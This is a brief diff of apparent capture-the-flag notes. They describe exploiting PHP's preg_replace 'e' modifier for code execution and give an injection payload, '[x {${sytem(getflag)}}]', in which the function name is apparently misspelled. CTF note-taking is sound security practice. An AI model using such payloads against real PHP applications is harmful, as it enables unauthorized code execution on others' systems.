@@ -1,0 +1,4 @@
+* pre_replace with delimiter "e",  exec code replace we can exploit this
+* regex [x (.*)]
+
+- [x {${sytem(getflag)}}]
